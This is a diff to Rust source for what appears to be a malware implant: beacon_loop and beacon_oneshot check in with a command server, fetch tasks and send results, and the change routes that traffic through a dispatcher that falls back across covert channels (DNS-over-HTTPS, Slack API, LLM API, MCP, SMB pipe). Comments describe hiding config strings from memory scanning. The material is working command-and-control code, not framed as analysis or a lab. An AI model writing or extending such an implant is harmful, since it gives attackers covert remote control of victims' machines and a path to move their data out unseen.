@@ -48,6 +48,12 @@ pub unsafe fn beacon_loop() {
     // sees ciphertext, not cleartext server_host/beacon_uri strings.
     crate::mem::register_owned(config_plain);
 
+    // Initialize the channel dispatcher with the beacon's config + primary
+    // channel. The dispatcher replaces the old direct `channel_post_frame`
+    // call — all transport now flows through `channels::dispatch_send_recv`.
+    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
+    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
+
     // Per-implant keypair: if the server patched an implant private key, use it.
     // Otherwise generate a fresh ephemeral keypair (compile-time / dev path).
     let kp = if let Some(ref priv_bytes) = implant.implant_priv {
@@ -101,12 +107,9 @@ pub unsafe fn beacon_loop() {
     loop {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
-        let resp = crate::transport::channel_post_frame(
-            cfg.server_host.as_bytes(),
-            cfg.server_port,
-            &frame,
-            cfg.use_tls,
-        );
+        let resp = unsafe {
+            crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame)
+        };
         if resp.is_some() {
             break;
         }
@@ -165,12 +168,15 @@ pub unsafe fn beacon_loop() {
         counter += 1;
         pending.clear();
 
-        let Some(body) = crate::transport::channel_post_frame(
-            cfg.server_host.as_bytes(),
-            cfg.server_port,
-            &frame,
-            cfg.use_tls,
-        ) else {
+        let body = unsafe {
+            crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame)
+        };
+        let Some(body) = body else {
+            // Channel failed — try fallback before giving up on this cycle.
+            let active = crate::channels::get_active();
+            if let Some(fb) = crate::channels::next_fallback(active) {
+                crate::channels::set_active(fb);
+            }
             continue;
         };
 
@@ -205,12 +211,13 @@ pub unsafe fn beacon_loop() {
                         &TaskResponse::encode_vec(&pending)
                             .expect("flush batch encodes within MAX_BLOB_LEN"),
                     );
-                    let _ = crate::transport::channel_post_frame(
-                        cfg.server_host.as_bytes(),
-                        cfg.server_port,
-                        &frame,
-                        cfg.use_tls,
-                    );
+                    let _ = unsafe {
+                        crate::channels::dispatch_send_recv(
+                            &ch_ctx,
+                            crate::channels::get_active(),
+                            &frame,
+                        )
+                    };
                     counter += 1;
                     pending.clear();
                 }
@@ -242,6 +249,10 @@ pub unsafe fn beacon_oneshot() -> u32 {
         };
     crate::mem::register_owned(config_plain);
     // DIAG step 1: config loaded OK
+
+    // Initialize channel dispatcher (same as beacon_loop).
+    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
+    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
 
     let kp = if let Some(ref priv_bytes) = implant.implant_priv {
         ImplantKeypair::from_secret_bytes(*priv_bytes)
@@ -282,12 +293,13 @@ pub unsafe fn beacon_oneshot() -> u32 {
     for _ in 0..10 {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
-        if crate::transport::channel_post_frame(
-            cfg.server_host.as_bytes(),
-            cfg.server_port,
-            &frame,
-            cfg.use_tls,
-        )
+        if unsafe {
+            crate::channels::dispatch_send_recv(
+                &ch_ctx,
+                crate::channels::get_active(),
+                &frame,
+            )
+        }
         .is_some()
         {
             checked_in = true;
@@ -312,12 +324,14 @@ pub unsafe fn beacon_oneshot() -> u32 {
             &TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
         );
         counter += 1;
-        let Some(body) = crate::transport::channel_post_frame(
-            cfg.server_host.as_bytes(),
-            cfg.server_port,
-            &frame,
-            cfg.use_tls,
-        ) else {
+        let body = unsafe {
+            crate::channels::dispatch_send_recv(
+                &ch_ctx,
+                crate::channels::get_active(),
+                &frame,
+            )
+        };
+        let Some(body) = body else {
             continue;
         };
         let Ok(raw) = parse_frame(&body) else {
@@ -356,12 +370,13 @@ pub unsafe fn beacon_oneshot() -> u32 {
                     .expect("oneshot tail batch encodes within MAX_BLOB_LEN"),
             );
             counter += 1;
-            let _ = crate::transport::channel_post_frame(
-                cfg.server_host.as_bytes(),
-                cfg.server_port,
-                &rframe,
-                cfg.use_tls,
-            );
+            let _ = unsafe {
+                crate::channels::dispatch_send_recv(
+                    &ch_ctx,
+                    crate::channels::get_active(),
+                    &rframe,
+                )
+            };
         }
         break;
     }
@@ -413,19 +428,13 @@ fn execute(
             vec![Response::Ok]
         }
         Command::SetChannel { channel } => {
-            let ch = match channel {
-                0 => crate::transport::Channel::Https,
-                1 => crate::transport::Channel::DohDns,
-                2 => crate::transport::Channel::SlackApi,
-                3 => crate::transport::Channel::LlmApi,
-                4 => crate::transport::Channel::Mcp,
-                5 => crate::transport::Channel::WebTrans,
-                _ => crate::transport::Channel::SmbPipe,
-            };
-            crate::transport::set_channel(ch);
+            // Use from_wire_u8 for backward compat with old servers, then map
+            // to the new channel scheme.
+            let ch = crate::channels::Channel::from_wire_u8(channel);
+            crate::channels::set_active(ch);
             let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
             out.extend_from_slice(b"Channel set to: ");
-            out.extend_from_slice(crate::transport::channel_name(ch).as_bytes());
+            out.extend_from_slice(ch.name().as_bytes());
             vec![Response::Output(out)]
         }
         Command::Trex => {
